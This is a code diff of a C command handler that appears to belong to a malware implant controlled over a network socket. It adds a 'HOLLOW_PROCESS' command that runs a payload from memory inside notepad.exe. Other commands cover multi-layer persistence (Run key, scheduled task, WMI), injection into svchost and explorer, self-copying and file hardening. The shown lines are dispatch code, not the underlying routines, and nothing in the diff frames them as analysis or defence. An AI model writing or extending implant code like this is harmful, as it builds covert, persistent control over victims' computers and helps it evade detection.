@@ -141,7 +141,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies + ALL layers: Run key + Task + WMI + Injection + NTFS hardening]";
+        result = "[Spawned 3 copies + ALL layers: Run key, Task, WMI, Injection, NTFS, Fileless Hollow]";
     }
     else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
         sys_unprotect_process();
@@ -159,7 +159,11 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     }
     else if (strcmp(cmd, "INJECT_PROCESS") == 0) {
         sys_inject_process();
-        result = "[Process injection attempted: payload injected into svchost/explorer]";
+        result = "[Process injection attempted: payload path injected into svchost/explorer]";
+    }
+    else if (strcmp(cmd, "HOLLOW_PROCESS") == 0) {
+        sys_hollow_process();
+        result = "[Process hollowing: notepad.exe running our payload purely from memory]";
     }
     else if (strcmp(cmd, "HARDEN_FILES") == 0) {
         sys_harden_files();
